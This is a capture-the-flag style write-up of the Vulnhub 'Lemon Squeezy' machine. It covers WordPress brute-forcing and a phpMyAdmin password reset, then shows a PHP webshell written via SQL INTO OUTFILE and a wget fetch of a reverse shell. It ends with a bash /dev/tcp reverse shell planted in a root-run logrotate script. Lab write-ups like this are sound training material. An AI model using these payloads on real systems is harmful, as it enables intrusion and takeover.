---
layout: single
title: "Vulnhub Write-up: Lemon Squeezy"
excerpt: "Writeup for an OSCP-like machine created by my hackin' homie"
date: 2020-05-13
header:
  teaser: #/assets/images/Stripe-Vulnhub/vulnhub.png
  teaser_home_page: true
classes: wide
categories:
  - vulnhub
  - infosec
tags:
  - enumeration
  - wordpress
  - sql
---



My study partner and former colleague recently created an OSCP-like machine for Vulnhub, as my machine Stripes already has a writeup available, I felt his machine must be a bit lonely so I decided to be the first one to draw blood and create this writeup.

You can download the machine from vulhub: https://www.vulnhub.com/entry/lemonsqueezy-1,473/

## Summary 

- Scan wordpress to obtain both usernames and passwords
- Obtain PHPmyadmin creds and login
- Create backdoor by abusing SQL CLI access
- Keep squeezing the machine until the hidden escalation vector is identified

## Enumeration 
### Nmap :

![nmap](/assets/images/lemonsqueezy/1.jpg)


Full port scan shows just 80 (HTTP) open.
Navigating to 80 shows just the default apache page.
Gobuster shows that wordpress is installed, for good measure I started a dirbuster scan in the background in case wordpress was a red herring, 
however was confident that enumerating with wpscan would yield some information.

        wpscan --url http://lemonsqueezy/wordpress --enumerate u

As below we get 2 users:

![users](/assets/images/lemonsqueezy/2.JPG)

Next I ran good old rockyou against them:

        wpscan --url http://lemonsqueezy/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames lemon,orange

The first password is found very fast, I left the attack going on lemon but am highly doubtful it will find anything, I will move onto logging in:


![password](/assets/images/lemonsqueezy/3.JPG)

After seeing we will not be able to upload a shell, I had a look around the panel and found a draft post with a password in it.

I tried it in phpmyadmin first, as the draft was created by the current user (orange), and was able to log into phpmyadmin as orange with this PW first try

I had a brief look for exploits for the phpmyadmin version however decided to see what I could and couldn't do in here first.
Turns out I can set a new password value for lemon, which should allow me to log into the admin panel in WP and get a shell.
I changed the password to "password" and logged in.


![change_pass](/assets/images/lemonsqueezy/4.JPG)

Looks like the themes cannot be edited and media cannot be uploaded, seems to be intentionally hardened against this vector - so we will put a malicious plugin together and get shell this way.
I used a handy tool called wordpwn to spin a malicious plugin together - however I failed to realise that ALL upload functionailty is broken - so this did not work.
I went back to Phpmyadmin where I am unable to create new databases.
What I can do however is run direct sql queries.
I used this to create a webshell and confirm code execution as below:

        select "<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/html/wordpress/wp-content/uploads/shell.php'

confirmed code execution with whoami:

        http://lemonsqueezy/wordpress/wp-content/uploads/shell.php?cmd=whoami

![change_pass](/assets/images/lemonsqueezy/5.JPG)

I tried a few reverse shell oneliners however none worked so I gave up and simply hosted a php reverse shell, 
amended the IP and then grabbed with wget:

         http://lemonsqueezy/wordpress/wp-content/uploads/shell.php?cmd=wget%20http://192.168.20.132/1.php

I then started a listener, navigated to the shell I just grabbed and now have a proper low priv foothold:

        http://lemonsqueezy/wordpress/wp-content/uploads/1.php


![low_priv](/assets/images/lemonsqueezy/6.JPG)

I upgraded my shell because I am both lazy and fancy

   In remote terminal:
   
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        Ctrl-Z
   In Kali terminal:
   
        stty -a
        stty raw -echo
        fg
        stty rows 20
	
Ta-da, now I have hand features such as autocomplete, access to bash history etc.
One of the first things I do with a www-data shell is go straight to /var/www/ and snoop around for additional web apps and credentials,
I was surprised to see user.txt in there, I did not think I would be able to read yet, however I was able to grab the flag - I suspect this means that we will 
either be pivoting straight to root or be able to read root flag as lemon/orange

![low_priv](/assets/images/lemonsqueezy/7.JPG)

*fun fact, flag decodes to "Music can change your life, "


## Privilege Escalation 

I did not find out anything in here I did not already know, I also manually checked for local listening ports and sudo commands aswell as snooped around orange's directory, so I decided to infiltrate some enumeration scripts to finish the rest of the groundwork for me.
After trying linenum and linpeas only linux smart enum gave me some useful info, I suspect this is because the binary was hidden by being called logrotate
https://github.com/diego-treitos/linux-smart-enumeration

![logrotate](/assets/images/lemonsqueezy/8.JPG)

I overwrote the code inside logrotate with a generic bash reverse shell one liner and got a shell back as root.

        #!/bin/bash
        bash -i >& /dev/tcp/192.168.20.132/8080 0>&1

![root_proof](/assets/images/lemonsqueezy/9.JPG)

The flag by itself does not decode, however if you add it to the second flag you get a profound bit of wisdom.
I will leave this to the solver to find this :)

All in all I think this was a fantastic OSCP prep machine, I personally preffered the user foothold over the privilege escalation but it certainly made me "squeeze" a bit harder huehuehue



